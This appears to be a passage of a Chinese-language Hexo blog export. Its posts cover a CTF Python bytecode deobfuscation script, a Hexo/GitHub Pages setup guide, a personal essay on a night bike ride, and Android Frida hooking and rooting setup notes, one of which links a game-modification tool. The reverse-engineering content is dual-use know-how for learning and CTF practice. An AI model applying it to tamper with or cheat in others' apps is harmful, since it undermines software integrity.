<h5 id="题目是3-9的，不过在这里就可以直接搜其他版本的也一样cpython-3-9"><a href="#题目是3-9的，不过在这里就可以直接搜其他版本的也一样cpython-3-9" class="headerlink" title="题目是3.9的，不过在这里就可以直接搜其他版本的也一样cpython 3.9"></a>题目是3.9的，不过在这里就可以直接搜其他版本的也一样<a href="https://github.com/python/cpython/blob/3.9/Objects/codeobject.c">cpython 3.9</a></h5><h5 id><a href="#" class="headerlink" title></a><img src="/2023/08/23/%E5%88%9D%E6%8E%A2python-bytecode/image-20230823153127421.png" alt="image-20230823153127421"></h5><h5 id="这里的co-code是字节码的长度标识，在patch时需要注意修复长度，其他标志位也需要注意（赛时就是co-lnotab对齐问题导致的无法反编译）"><a href="#这里的co-code是字节码的长度标识，在patch时需要注意修复长度，其他标志位也需要注意（赛时就是co-lnotab对齐问题导致的无法反编译）" class="headerlink" title="这里的co_code是字节码的长度标识，在patch时需要注意修复长度，其他标志位也需要注意（赛时就是co_lnotab对齐问题导致的无法反编译）"></a>这里的co_code是字节码的长度标识，在patch时需要注意修复长度，其他标志位也需要注意（赛时就是co_lnotab对齐问题导致的无法反编译）</h5><p><img src="/2023/08/23/%E5%88%9D%E6%8E%A2python-bytecode/image-20230823154536966.png" alt="image-20230823154536966"></p>
<h5 id="cpython-x2F-Objects-x2F-lnotab-notes-txt-at-3-9-·-python-x2F-cpython-github-com-可以参考文档"><a href="#cpython-x2F-Objects-x2F-lnotab-notes-txt-at-3-9-·-python-x2F-cpython-github-com-可以参考文档" class="headerlink" title="cpython&#x2F;Objects&#x2F;lnotab_notes.txt at 3.9 · python&#x2F;cpython (github.com)可以参考文档"></a><a href="https://github.com/python/cpython/blob/3.9/Objects/lnotab_notes.txt">cpython&#x2F;Objects&#x2F;lnotab_notes.txt at 3.9 · python&#x2F;cpython (github.com)</a>可以参考文档</h5><h5 id="去花脚本（R1mao那里偷来的）："><a href="#去花脚本（R1mao那里偷来的）：" class="headerlink" title="去花脚本（R1mao那里偷来的）："></a>去花脚本（R1mao那里偷来的）：</h5><pre><code class="python">import dis
import RightBack
import marshal
import types
from graphviz import Digraph
 

def get_funcs(module):
    funcs = []
    for name in dir(module):
        obj = getattr(module, name)
        if isinstance(obj, types.FunctionType):
           funcs.append(obj)
    return funcs

def get_extend_size(code, offset):
    ptr = offset

    while True:
        op = code[ptr]
        if op != dis.EXTENDED_ARG:
            break
        ptr += 2

    return ptr - offset
    

class InstWrapper:
    def __init__(self, prefix_insn : list[dis.Instruction], main_insn : dis.Instruction):
        self.offset = main_insn.offset
        self.prefix_insn = prefix_insn
        self.main_insn = main_insn
        if len(prefix_insn) != 0:
            self.offset = prefix_insn[0].offset
        self.preds = set()
        self.succs = set()

    def edge(self, v1):
        v1.preds.add(self)
        self.succs.add(v1)

    def unlink(self):
        for n in self.preds:
            n.succs.remove(self)
        for n in self.succs:
            n.preds.remove(self)

    def size(self):
        return 2 * (len(self.prefix_insn) + 1)

    def print_asm(self):
        assert len(self.succs) &lt;= 2
        result = []
        if self.main_insn.opcode not in dis.hasjabs and self.main_insn.opcode not in dis.hasjrel:
            for p in self.prefix_insn:
                result += [p.opcode, p.arg]
            result += [self.main_insn.opcode]
            if self.main_insn.arg:
                result.append(self.main_insn.arg)
            else:
                result.append(0)
            return result
        s = list(self.succs)
        ref_target = None
        for n in s:
            if self.offset + self.size() != n.offset:
                ref_target = n.offset
                break
        argval = ref_target
        if self.main_insn.opcode in dis.hasjrel:
            argval = ref_target - (self.offset + len(self.prefix_insn) * 2) - 2
        byte_size = len(self.prefix_insn) + 1
        argval &amp;= (2 ** (8 * byte_size)) - 1
        raw = int.to_bytes(argval, byte_size, byteorder=&#39;big&#39;)
        for i in range(len(self.prefix_insn)):
            result += [dis.opmap[&#39;EXTENDED_ARG&#39;], raw[i]]
        result += [self.main_insn.opcode, raw[len(self.prefix_insn)]]
        return result
            
    def __str__(self) -&gt; str:
        return &#39;%04d %s\t(%s)&#39; % (self.offset, self.main_insn.opname, str(self.main_insn.argval) if self.main_insn.argval else &#39;&#39;)
    
def fix_invalid(func):
    raw_code = func.__code__.co_code
    insn_map = &#123;&#125;

    for insn in dis._get_instructions_bytes(raw_code):
        insn_map[insn.offset] = insn

    trace_result = dict()

    def trace_pc(code, insn_map, offset):
        nonlocal trace_result
        assert offset in insn_map
        
        extend_size = get_extend_size(code, offset)
        cur_size = extend_size + 2
        cur = insn_map[offset + extend_size]
        if offset not in trace_result.keys():
            trace_result.update(&#123;offset : cur_size&#125;)
        else:
            return
        
        if cur.opname == &#39;RETURN_VALUE&#39;:
            return
        elif cur.opcode in dis.hasjabs + dis.hasjrel:
            jump_target = cur.argval
            if cur.opname == &#39;JUMP_FORWARD&#39; or cur.opname == &#39;JUMP_ABSOLUTE&#39;:
                trace_pc(code, insn_map, jump_target)
                return
            else:
                trace_pc(code, insn_map, jump_target)
                trace_pc(code, insn_map, offset + cur_size)
        else:
            trace_pc(code, insn_map, offset + cur_size)

    trace_pc(raw_code, insn_map, 0)

    flat_mem = [0 for i in range(len(raw_code))]
    for k, v in trace_result.items():
        for i in range(v):
            flat_mem[k + i] = 1
    new_code = []
    idx = 0 
    for d in raw_code:
        if flat_mem[idx] == 1:
            new_code.append(d)
        else:
            new_code.append(dis.opmap[&#39;NOP&#39;])
        idx += 1

    new_code = bytes(new_code)
    return new_code

def recompile(func, new_code):
    all_wrap = &#123;&#125;
    worker = &#123;&#125;
    temp = []
    last = None
    for insn in dis._get_instructions_bytes(new_code):
        if insn.opname == &#39;EXTENDED_ARG&#39;:
            temp.append(insn)
        else:
            inst = InstWrapper(temp.copy(), insn)
            if inst.offset in worker.keys():
                for other in worker[inst.offset]:
                    other.edge(inst)
                worker.pop(inst.offset)
            if last and last.main_insn.opname != &#39;RETURN_VALUE&#39; and last.main_insn.opname != &#39;JUMP_FORWARD&#39; and last.main_insn.opname != &#39;JUMP_ABSOLUTE&#39;:
                last.edge(inst)
            last = inst
            if inst.main_insn.opcode in dis.hasjabs + dis.hasjrel:
                
                target = inst.main_insn.argval
                if target in all_wrap.keys():
                    inst.edge(all_wrap[target])
                else:
                    if target in worker.keys():
                        worker[target].add(inst)
                    else:
                        worker[target] = set([inst])
            all_wrap.update(&#123;inst.offset : inst&#125;)
            temp.clear()


    all_wrap = list(all_wrap.values())
    while True:
        to_remove = []
        for n in all_wrap:
            if len(n.preds) == 0 and n.offset != 0:
                n.unlink()
                to_remove.append(n)
            if len(n.preds) == 1 and len(n.succs) == 1 and n.main_insn.opname == &#39;JUMP_FORWARD&#39;:
                n.unlink()
                p = n.preds.pop()
                s = n.succs.pop()
                p.edge(s)
                to_remove.append(n)
        if len(to_remove) == 0:
            break
        for n in to_remove:
            all_wrap.remove(n)

    entry_point = None
    for i in all_wrap:
        if i.offset == 0:
            entry_point = i
            break
    
    visited = set()
    offset = 0
    def visit(cur : InstWrapper):
        nonlocal visited, offset
        cur.offset = offset
        offset = offset + cur.size()
        succs = sorted(list(cur.succs), key = lambda a : a.offset)
        for node in succs:
            if node not in visited:
                visited.add(node)
                visit(node)

    visit(entry_point)
    new_bytecode = []
    for w in all_wrap:
        new_bytecode += w.print_asm()
    print(new_bytecode)
    new_bytecode = bytes(new_bytecode)

    code = func.__code__
    new_code = types.CodeType(
        code.co_argcount,
        code.co_posonlyargcount,
        code.co_kwonlyargcount,
        code.co_nlocals,
        code.co_stacksize,
        code.co_flags,
        new_bytecode, 
        code.co_consts,
        code.co_names,
        code.co_varnames,
        code.co_filename,
        func.__name__,
        code.co_firstlineno,
        code.co_lnotab,
        code.co_freevars,
        code.co_cellvars
    )
    dot = Digraph(func.__name__)
    for n in all_wrap:
        dot.node(str(n.offset), str(n))
        
    for n in all_wrap:
        for pred in n.preds:
            dot.edge(str(pred.offset), str(n.offset))
    #dot.view()
    return new_code


file = open(&#39;RightBack.pyc&#39;, &#39;rb&#39;)
data = file.read()
file.close()
file = open(&#39;RightBack_fix.pyc&#39;, &#39;wb&#39;)

for f in get_funcs(RightBack):
    new_code = fix_invalid(f)
    code_obj = recompile(f, new_code)
    setattr(RightBack, f.__name__, code_obj)

    byc = open(f.__name__ + &#39;.pyc&#39;, &#39;wb&#39;)
    byc.write(b&#39;\x61\x0D\x0D\x0A\x00\x00\x00\x00\xC1\xC5\xC0\x64\x9C\x27\x00\x00&#39;)
    marshal.dump(code_obj, byc)
    byc.close()
    #raw_code = f.__code__.co_code
    #data = data.replace(raw_code, new_code)

file.write(data)
file.close()
</code></pre>
]]></content>
      <tags>
        <tag>re python</tag>
      </tags>
  </entry>
  <entry>
    <title>初探驱动</title>
    <url>/2024/01/15/%E5%88%9D%E6%8E%A2%E9%A9%B1%E5%8A%A8/</url>
    <content><![CDATA[<h6 id="PREFACE：偷点资料入个门吧，性质应该属于随便看看"><a href="#PREFACE：偷点资料入个门吧，性质应该属于随便看看" class="headerlink" title="PREFACE：偷点资料入个门吧，性质应该属于随便看看"></a>PREFACE：偷点资料入个门吧，性质应该属于随便看看</h6><span id="more"></span>
]]></content>
  </entry>
  <entry>
    <title>to build your blog on github</title>
    <url>/2022/08/26/%E5%9F%BA%E4%BA%8Ehexo%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="Build-Blog-with-Hexo-and-GitHub-Pages"><a href="#Build-Blog-with-Hexo-and-GitHub-Pages" class="headerlink" title="Build Blog with Hexo and GitHub Pages"></a>Build Blog with Hexo and GitHub Pages</h1><h5 id="Published-2022-x2F-08-x2F-26"><a href="#Published-2022-x2F-08-x2F-26" class="headerlink" title="Published: 2022&#x2F;08&#x2F;26"></a>Published: 2022&#x2F;08&#x2F;26</h5><h5 id="Updated-2022-x2F-08-x2F-26"><a href="#Updated-2022-x2F-08-x2F-26" class="headerlink" title="Updated: 2022&#x2F;08&#x2F;26"></a>Updated: 2022&#x2F;08&#x2F;26</h5><h2 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE"></a>PREFACE</h2><h6 id="As-my-very-first-blog-here-I-want-to-record-some-point-and-hope-that-it-will-help-whoever-wants-to-build-his-own-blog"><a href="#As-my-very-first-blog-here-I-want-to-record-some-point-and-hope-that-it-will-help-whoever-wants-to-build-his-own-blog" class="headerlink" title="As my very first blog, here I want to record some point and hope that it will help whoever wants to build his own blog."></a>As my very first blog, here I want to record some point and hope that it will help whoever wants to build his own blog.</h6><h6 id="THE-THINGS-NEED-TO-BE-DONE"><a href="#THE-THINGS-NEED-TO-BE-DONE" class="headerlink" title="THE THINGS NEED TO BE DONE"></a>THE THINGS NEED TO BE DONE</h6><span id="more"></span>
<hr>
<blockquote>
<p>hexo</p>
<blockquote>
<p>Hexo is a blog framework based on Node.js. We can maintain a Hexo instance on local machine, and publish it to Github pages.</p>
</blockquote>
</blockquote>
<blockquote>
<p>node.js</p>
<blockquote>
<p>an free open source server environment which can be ran on Windows, Linux, Unix, Mac OS X, ect.</p>
</blockquote>
</blockquote>
<blockquote>
<p>set up the github account</p>
<blockquote>
<p>GitHub Pages is a static site hosting service designed to host your personal, organization or project pages directly from a GitHub repository</p>
</blockquote>
</blockquote>
<h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><p>Go to <a href="https://nodejs.org/en/download/">Download - Node.js</a>, choose and install the right version for your computer.</p>
<p>Run <code>node -v</code> then <code>npm -v</code> on cmd, check your Node.js version if it doesn’t output two version of node and npm.</p>
<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>Go to <a href="https://git-scm.com/downloads">Download - git</a>, leave the options default if you don’t understand.</p>
<p>When you are done, use cmd to chack if you do it right by run</p>
<blockquote>
<p><code>git --version</code><br>If it outputs your git version, you do it right.</p>
</blockquote>
<p>run</p>
<p><code>git config --global user.name &quot;Your Name&quot;</code><br><code>git config --global user.email youremail@example.com</code><br><code> ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code></p>
<p>and you will get two files(your own screen name and your email)</p>
<h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><p>Run <code>npm install hexo-cli -g</code> on a folder you would like to</p>
<p>Run <code>hexo init</code> and <code>npm install</code> on THE FOLDER YOU WANT TO PUT YOUR BLOG IN, run <code>hexo version</code>(<code>hexo -v</code>) to verify Hexo.</p>
<p>run <code>hexo g</code> then <code>hexo s</code> <code>(hexo server)</code> and visit <a href="http://localhost:4000/">your blog</a> (<a href="http://localhost:4000/">http://localhost:4000</a>, the default port is 4000, if it reports error, try to run <code>hexo s -i</code>, i stands for the port that isn’t occupied)</p>
<p>find <code>_config.yml</code>, find <code>deploy:</code>,part and edit:</p>
<p><code>deploy:</code><br><code>type: git</code><br><code>repo: git@github.com:yourname/yourname.github.io.git</code><br><code>branch: master</code></p>
<p>Create a GitHub Repository</p>
<h4 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS:"></a>TIPS:</h4><p>Change your GitHub Branch from “main” to “Master”</p>
<p>Find a file end with “id_rsa.pub” which generated when you install git and get the ssh key above. Copy it and paste it into your GitHub Repository ssh key</p>
<p>run <code>npm install hexo-deployer-git --save</code></p>
<p>Now, run <code>hexo d -g</code> and visit your GitHub wesite (which you can find in your repository SETTING), you should see your blog above. </p>
]]></content>
      <tags>
        <tag>tools</tag>
        <tag>hexo</tag>
        <tag>node.js</tag>
      </tags>
  </entry>
  <entry>
    <title>夜彳亍</title>
    <url>/2023/03/17/%E5%A4%9C%E5%BD%B3%E4%BA%8D/</url>
    <content><![CDATA[<h4 id="夜彳亍京城"><a href="#夜彳亍京城" class="headerlink" title="夜彳亍京城"></a>夜彳亍京城</h4><h6 id="题目来源于AiDai学长、bridge和nova等"><a href="#题目来源于AiDai学长、bridge和nova等" class="headerlink" title="题目来源于AiDai学长、bridge和nova等"></a>题目来源于AiDai学长、bridge和nova等</h6><h6 id="长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师"><a href="#长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师" class="headerlink" title="长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师"></a>长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师</h6><span id="more"></span>
<ul>
<li><a href="#1">夜彳亍</a></li>
<li><a href="#2">回程</a></li>
</ul>
<h4 id="夜彳亍"><a href="#夜彳亍" class="headerlink" title="夜彳亍"></a><div id="1">夜彳亍<div></div></div></h4><p>倒也没有什么特别想去的地方，但缘由是一直呆在校内挺累的，一天也没有什么安静的独处时间，于是乎于2023年3月17日夜晚八点零七分，欣然骑了个车夜彳亍。</p>
<p>这样的夜彳亍前一阵也来了一次，约莫是在下午的夜彳亍。但出校门右转，沿着高架上的地铁一路走，走到尽头，由于不能判断前面的路上了高架还能不能正常下来，便作罢回校。</p>
<p>这么走是没有目的的，所以也不看导航，但也总该有点方向，旁边的岔路晚上并不怎么开灯，对于夜彳亍来说似乎也有些危险。于是沿着同一个高架，同一个地铁线走，往左。天气很冷，夜晚夜彳亍比下午冷多了，尤其是骑车，颇有手指不可屈伸的美感。</p>
<p>但往左走原来也有尽头，高架只会带你走短短一些路。等到了路尾，发现没有路了，人群往四面散去。有些人似乎是执意孤行的，在末尾上了地铁。似乎都是大学生。短暂的二十载中，我也一直跟着地铁，我不知道该往哪走，我只知道大家都走这条路。不走这条路的人，或许附近有房，或许在附近打晚工，总归不是一道人。跟着一道人走，往往是没错的。但尽头没路了。但上地铁并不是我此行的目的，也不是我这个时间的想法。那往左拐，左边的人比较多，或许会指引我到什么地方。</p>
<p>这条路真的很长，长到看不出有什么尽头。就只是一路往下。这里真的很不像北京。或者说不像我想象中的北京。感觉就只是，无端的，荒凉。也许它并不荒凉。但是比想象中的荒凉。车水马龙。</p>
<p>这个点的车水马龙，并不是什么繁华的象征。</p>
<p>这意味着这条路是背离市中心的，向着居民区延伸的。</p>
<p>也许也不是，期间看到一些奇怪的路牌，但是并没有看到与之相称的人，或许是荒废已久的路牌。</p>
<p>一路走下去，没什么特别的。</p>
<p>就只是不断不断的出现岔路，岔路的尽头是黑的，一进岔路就几乎没有光了。我的小小共享单车没有车头灯，如果在八十线小城骑一辆有灯的小电动，也许可以敢往下拐，但是我只能不断前进。</p>
<p>就只是车越来越少，人行道上也看不见什么人了。</p>
<p>那看看手机地图吧。</p>
<p>路途中间我是没有看地图的。本来就是没有目的的夜彳亍，看地图总归煞了风景。但那条路真的很长。长得怎么骑也看不到尽头，我也不知道我骑了多远。但这趟夜彳亍我不打算过夜的，我的东西还放在图书馆，得十一点前回来收拾。所以还是看了看地图。</p>
<p>我原以为我一直在走大道。但实际上似乎还是走到小道里了。</p>
<p>看不出来，因为一直在自认为最光亮的一条路上走。所以回过头看地图，却也感到诧异。</p>
<p>不过嘛，没有目的的夜彳亍，确实应该是这样的，也比较有意思。</p>
<p>那就回来吧，其实也挺无聊的。</p>
<p>一般都是这样，来的时候总觉得走了好长好长一段路，回首却一会就到了。</p>
<p>来的时候，右边看到一个卖馒头的。</p>
<p>看不清，似乎没人，看到了微信收款码。</p>
<p>还听到（或许是看到呢）一清二楚的大馒头一块钱一个。</p>
<p>来的时候，就在最后一个十字路口，有一个老太在卖玉米。</p>
<p>烤玉米，用一个炉子在烧。她似乎在将硬纸板一点一点的塞进去，也许是有火星子冒出来。</p>
<p>她戴的手套看着很暖和。人群中似乎就我一个人愚蠢到不戴手套。但是具体的我没太注意，绿灯亮起我也就过去了。她似乎在对着过往的人群，大学生或什么，并不大声地喊着烤玉米或玉米的价格或什么。总能在眼里看到一些希冀，或者其他什么。</p>
<p>总归这次出行没注意什么细节，也许是夜里冷，人太少的缘故。但过来的路确实也又有些不同。总感觉，遛狗的人，悠闲的人多了。</p>
<p>提着菜的，忙碌的人比来时的路少了。</p>
<p>回到十字路口。茫然发现，其实过来这条路并不长。</p>
<p>确实，回头看的时候总觉得，其实确实不是一条有多长的路。</p>
<p>但反正，还有时间，那在地铁入口的路口，往右拐看看。</p>
<p>但房屋却比较高大了。虽然还是稀疏。道路也比较宽广了。</p>
<p>一阵后，感觉没有那么想继续了，回程吧。下次或许从这里继续。</p>
<p>也有可能去看一下水库，据说风景不错。但是水库大抵是不能晚上去，那只能白天夜彳亍去一趟。</p>
<h4 id="·-回程"><a href="#·-回程" class="headerlink" title="· 回程"></a><div id="2">· 回程<div></div></div></h4><p>总归是一会就回来了，什么也没发生。本来也不期待什么会发生。</p>
<p>但也还算发生了点什么，算是给点时间。</p>
<p>回来看这群打ctf的好像也没聊啥，那倒没错过啥。</p>
<p>虽然水群太多是该戒戒就是。</p>
<p>倒是收到某位的消息，想给我“测评”铃芽之旅。你最好是在测评，还是等我们这些非北大生惨兮兮下周看完电影再聊吧。</p>
<h6 id="感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。"><a href="#感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。" class="headerlink" title="感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。"></a>感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。</h6><h6 id="没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。"><a href="#没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。" class="headerlink" title="没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。"></a>没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。</h6>]]></content>
  </entry>
  <entry>
    <title>安卓hook初探</title>
    <url>/2023/08/28/%E5%AE%89%E5%8D%93hook%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface-隐约记得之前弄过一次，但是这次换了个环境折腾了一整天吧还挺麻烦的，总之记录一下后面搞起来方便"><a href="#preface-隐约记得之前弄过一次，但是这次换了个环境折腾了一整天吧还挺麻烦的，总之记录一下后面搞起来方便" class="headerlink" title="preface: 隐约记得之前弄过一次，但是这次换了个环境折腾了一整天吧还挺麻烦的，总之记录一下后面搞起来方便."></a>preface: 隐约记得之前弄过一次，但是这次换了个环境折腾了一整天吧还挺麻烦的，总之记录一下后面搞起来方便.</h6><span id="more"></span>

<hr>
<h5 id="环境：mumu12模拟器"><a href="#环境：mumu12模拟器" class="headerlink" title="环境：mumu12模拟器"></a>环境：mumu12模拟器</h5><h6 id="adb连接："><a href="#adb连接：" class="headerlink" title="adb连接："></a>adb连接：</h6><p><img src="/2023/08/28/%E5%AE%89%E5%8D%93hook%E5%88%9D%E6%8E%A2/image-20230828105143258.png" alt="image-20230828105143258"></p>
<h5 id="连接：adb-exe-connect-127-0-0-1-断开：adb-exe-disconnect-127-0-0-1"><a href="#连接：adb-exe-connect-127-0-0-1-断开：adb-exe-disconnect-127-0-0-1" class="headerlink" title="连接：adb.exe connect 127.0.0.1:*****  断开：adb.exe disconnect 127.0.0.1:*****"></a>连接：<code>adb.exe connect 127.0.0.1:*****</code>  断开：<code>adb.exe disconnect 127.0.0.1:*****</code></h5><h5 id="检查设备：adb-exe-devices"><a href="#检查设备：adb-exe-devices" class="headerlink" title="检查设备：adb.exe devices"></a>检查设备：<code>adb.exe devices</code></h5><h5 id="shell-adb-s-127-0-0-1-shell-或-adb-shell"><a href="#shell-adb-s-127-0-0-1-shell-或-adb-shell" class="headerlink" title="shell: adb -s 127.0.0.1:***** shell 或 adb shell"></a>shell: <code>adb -s 127.0.0.1:***** shell</code> 或 <code>adb shell</code></h5><hr>
<h5 id="查看手机CPU架构-：-getprop-ro-product-cpu-abi"><a href="#查看手机CPU架构-：-getprop-ro-product-cpu-abi" class="headerlink" title="查看手机CPU架构 ： getprop ro.product.cpu.abi"></a>查看手机CPU架构 ： <code>getprop ro.product.cpu.abi</code></h5><h5 id="找到对应frida-server：-frida-version检查本机frida版本Releases-·-frida-x2F-frida-github-com"><a href="#找到对应frida-server：-frida-version检查本机frida版本Releases-·-frida-x2F-frida-github-com" class="headerlink" title="找到对应frida server： frida version检查本机frida版本Releases · frida&#x2F;frida (github.com)"></a>找到对应frida server： <code>frida version</code>检查本机frida版本<a href="https://github.com/frida/frida/releases">Releases · frida&#x2F;frida (github.com)</a></h5><h5 id="运行frida-server-adb-push-frida-server-data-local-tmp"><a href="#运行frida-server-adb-push-frida-server-data-local-tmp" class="headerlink" title="运行frida server: adb push frida-server /data/local/tmp/"></a>运行frida server: <code>adb push frida-server /data/local/tmp/</code></h5><h5 id="cd-data-local-tmp"><a href="#cd-data-local-tmp" class="headerlink" title="cd /data/local/tmp"></a><code>cd /data/local/tmp</code></h5><h5 id="frida-server"><a href="#frida-server" class="headerlink" title="./frida-server"></a><code>./frida-server</code></h5><h5 id="电脑查看手机正在运行的进程：firda-ps-U"><a href="#电脑查看手机正在运行的进程：firda-ps-U" class="headerlink" title="电脑查看手机正在运行的进程：firda-ps -U"></a>电脑查看手机正在运行的进程：<code>firda-ps -U</code></h5><h5 id="端口转发-adb-forward-tcp-27042-tcp-27042"><a href="#端口转发-adb-forward-tcp-27042-tcp-27042" class="headerlink" title="端口转发: adb forward tcp:27042 tcp:27042"></a>端口转发: <code>adb forward tcp:27042 tcp:27042</code></h5><h5 id="查看包名："><a href="#查看包名：" class="headerlink" title="查看包名："></a>查看包名：</h5><pre><code class="text">#查看进程中的信息
#process = frida.get_usb_device().enumerate_processes()
#print(process)

1.新开一个shell输入命令：
adb shell am monitor
2.启动需要获取包名的应用
</code></pre>
<hr>
<h5 id="运行frida脚本-frida-U-l-your-script-js-f-com-yourapp-package"><a href="#运行frida脚本-frida-U-l-your-script-js-f-com-yourapp-package" class="headerlink" title="运行frida脚本:frida -U -l your-script.js -f com.yourapp.package"></a>运行frida脚本:<code>frida -U -l your-script.js -f com.yourapp.package</code></h5><h5 id="frida检查包名：adb-shell-pm-list-packages-grep"><a href="#frida检查包名：adb-shell-pm-list-packages-grep" class="headerlink" title="frida检查包名：adb shell pm list packages | grep ***"></a>frida检查包名：<code>adb shell pm list packages | grep ***</code></h5><hr>
<h5 id="gg修改器-https-gameguardian-net-forum-files-file-2-gameguardian"><a href="#gg修改器-https-gameguardian-net-forum-files-file-2-gameguardian" class="headerlink" title="gg修改器:    https://gameguardian.net/forum/files/file/2-gameguardian/"></a>gg修改器:    <a href="https://gameguardian.net/forum/files/file/2-gameguardian/">https://gameguardian.net/forum/files/file/2-gameguardian/</a></h5>]]></content>
  </entry>
  <entry>
    <title>铁三awd渗透复盘</title>
    <url>/2024/04/24/%E9%93%81%E4%B8%89awd%E6%B8%97%E9%80%8F%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>安卓调试初探</title>
    <url>/2023/07/11/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识"><a href="#preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识" class="headerlink" title="preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识"></a>preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识</h6><span id="more"></span>

<h6 id="初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突"><a href="#初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突" class="headerlink" title="初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突"></a>初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突</h6><h5 id="几个尝试过或可以考虑的方案："><a href="#几个尝试过或可以考虑的方案：" class="headerlink" title="几个尝试过或可以考虑的方案："></a>几个尝试过<del>或可以考虑</del>的方案：</h5><table>
<thead>
<tr>
<th align="center">Android Studio</th>
<th align="center">mumu12</th>
<th align="center">qemu</th>
<th align="center">真机</th>
</tr>
</thead>
<tbody><tr>
<td align="center">选择多，但是arm调不动</td>
<td align="center">使用方便</td>
<td align="center"><del>配置麻烦，</del>多数时候没法用</td>
<td align="center"><del>准备尝试</del> <del>已配置，需要root，略麻烦</del> 启动！</td>
</tr>
</tbody></table>
<h5 id="1、Android-Studio"><a href="#1、Android-Studio" class="headerlink" title="1、Android Studio"></a>1、Android Studio</h5><p>在so有x86支持时为比较优解，可以随意选择安卓版本来使用。仅支持arm时本机能成功运行的镜像仅有：<img src="/2023/07/11/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/image-20230811134825647.png" alt="image-20230811134825647">armeabi-v7a的Nougat，但很多新的apk都是arm64-v8a，这里本机跑会报很多错，而且很慢很慢</p>
<p>2、正常情况下可以用nox或者雷电模拟器，稳定性还行，但是有wsl2的情况下会出奇怪问题（雷电号称是有兼容的，但是实测用起来会卡死，懒得修了直接换个）之前一直用的mumux，但是这两天连adb会触发强制更新，换成mumu12居然还可以用，属于比较惊喜的，在真机拿到前可以先用这个方案</p>
<p>mumu12用的x86的架构，但是实测是可以跑arm64-v8a的，具体原理不太懂，但是确实挺好用的，可以按照这篇操作，调试so层</p>
<p><a href="https://www.cnblogs.com/ddms/p/8820044.html">IDA远程调试Android中so文件 - jKing777 - 博客园 (cnblogs.com)</a></p>
<h5 id="3、qemu"><a href="#3、qemu" class="headerlink" title="3、qemu"></a>3、qemu</h5><p>搭建很麻烦，需要配置可视化，非常麻烦。</p>
<h5 id="4、真机"><a href="#4、真机" class="headerlink" title="4、真机"></a>4、真机</h5><p>理论上的最优解，但是不知道比起商业模拟器优多少呢</p>
<hr>
<h6 id="群开发高手那里收了个二手红米，还得是小米"><a href="#群开发高手那里收了个二手红米，还得是小米" class="headerlink" title="群开发高手那里收了个二手红米，还得是小米"></a><del>群开发高手那里收了个二手红米，还得是小米</del></h6><p>简单记录一下：</p>
<ul>
<li><p>收的手机是已经解了bl锁的，可以暂时跳过这一步（<a href="http://www.romleyuan.com/lec/read?id=83">小米手机官方解锁BootLoader图文教程-适用于全部机型20210925更新-ROM乐园官网 (romleyuan.com)</a>）</p>
<ul>
<li><p>”我的设备“ -&gt; “全部参数” -&gt; 连续点击“MIUI版本”进入开发者模式 -&gt; 在开发者模式中打开adb调试等选项</p>
</li>
<li><p><code>adb devices</code> 检查设备</p>
</li>
<li><p><code>adb shell</code>进入</p>
</li>
</ul>
</li>
<li><p>刷入TWRP进行root（刷失败了就下音量+电源键重新进入FASTBOOT，每次需要重新刷入）</p>
<ul>
